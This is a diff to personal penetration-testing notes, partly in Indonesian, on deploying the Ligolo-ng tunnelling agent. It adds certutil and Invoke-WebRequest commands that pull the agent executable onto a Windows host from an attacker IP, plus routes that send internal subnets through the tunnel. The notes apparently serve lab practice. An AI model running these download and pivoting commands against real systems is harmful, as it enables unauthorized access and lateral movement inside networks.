@@ -1,9 +1,13 @@
 
-# Ligolo-ng
 download ligolo agent
 [Releases · nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng/releases) 
 ```powershell
 upload '/home/kali/ligolo-ng/ligolo-agent.exe' 'ligolo-agent.exe'
+
+# wget
+certutil -urlcache -split -f http://10.10.15.236:8088/ligolo-agent.exe ligolo-agent.exe
+
+iwr -uri http://10.10.15.236:8088/ligolo-agent.exe -OutFile ligolo-agent.exe
 ```
 
 ```shell
@@ -26,6 +30,10 @@ add session to ligolo -> start
 
 ada tunnel
 ```shell
+# kalau banyak network
 sudo ip route add 192.168.100.0/24 dev ligolo
+
+# kalau single ip
+sudo ip route add 10.129.30.189/32 dev ligolo
 ```
 ![](Attachments/Pasted%20image%2020260811125046.png)
